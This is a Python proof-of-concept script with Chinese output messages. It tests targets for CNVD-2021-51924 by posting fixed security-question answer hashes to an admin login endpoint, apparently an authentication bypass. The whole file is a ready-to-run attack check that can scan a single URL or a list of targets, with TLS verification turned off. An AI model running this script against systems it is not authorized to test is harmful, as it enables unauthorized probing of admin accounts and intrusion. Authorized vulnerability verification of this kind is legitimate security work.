import requests
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def poc(target):
    session = requests.session()
    session.verify = False
    session.headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Referer": target + "/admin/login_login.action",
    }
    payload = "userBean.questionAnswer1=a0b5d0071821c2d338d05f1127a1b93c&userBean.questionAnswer2=a0b5d0071821c2d338d05f1127a1b93c&userBean.questionAnswer3=a0b5d0071821c2d338d05f1127a1b93c"
    try:
        result = session.post(target + "/admin/login_checkAnswer.action", params=payload, timeout=5).text
    except:
        print("[-]", target, "访问超时")
        return
    if "true" in result or "1" in result:
        print("[+]", target, "存在CNVD-2021-51924漏洞", result)
        return
    print("[-]", target, "不存在漏洞")


if __name__ == '__main__':
    print("""
   _____ _   ___      _______       ___   ___ ___  __        _____ __  ___ ___  _  _   
  / ____| \ | \ \    / /  __ \     |__ \ / _ \__ \/_ |      | ____/_ |/ _ \__ \| || |  
 | |    |  \| |\ \  / /| |  | |______ ) | | | | ) || |______| |__  | | (_) | ) | || |_ 
 | |    | . ` | \ \/ / | |  | |______/ /| | | |/ / | |______|___ \ | |\__, |/ /|__   _|
 | |____| |\  |  \  /  | |__| |     / /_| |_| / /_ | |       ___) || |  / // /_   | |  
  \_____|_| \_|   \/   |_____/     |____|\___/____||_|      |____/ |_| /_/|____|  |_|  
                                                                      By: xiaoWangSec""")
    parser = argparse.ArgumentParser(description='CNVD-2021-51924验证脚本')
    parser.add_argument('-t', '--target', help='目标文本')
    parser.add_argument('-u', '--url', help='单个目标')
    args = parser.parse_args()

    if args.target:
        try:
            with open(args.target, 'r') as file:
                for line in file:
                    url = line.strip()
                    poc(url)
        except FileNotFoundError:
            print(f'文件 {args.target} 不存在')
    elif args.url:
        poc(args.url)
    else:
        parser.print_help()

